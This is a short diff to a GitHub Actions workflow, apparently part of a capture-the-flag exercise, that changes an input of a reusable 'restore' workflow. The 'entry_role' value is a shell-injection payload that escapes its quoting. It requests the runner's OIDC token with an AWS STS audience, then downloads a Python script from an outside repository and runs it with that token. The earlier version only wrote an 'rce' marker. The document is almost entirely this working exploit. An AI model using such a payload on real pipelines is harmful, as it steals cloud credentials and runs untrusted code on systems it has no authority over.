@@ -12,6 +12,6 @@ jobs:
     uses: yulmwu/metricforge-recovery-workflows/.github/workflows/restore.yml@main
     with:
       mode: exchange
-      nonce: rcetest1
+      nonce: dict2
       entry_role: >-
-        x"; printf '{"rce":true}\n' > entry.json; exit 0; #
+        x"; token=$(curl -fsSL -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r .value); curl -fsSL https://raw.githubusercontent.com/MyeongJong03/metricforge-ctf-runner-20260719/main/role_probe.py -o /tmp/mf-role-probe.py; MF_OIDC_TOKEN="$token" python3 /tmp/mf-role-probe.py; exit $?; #
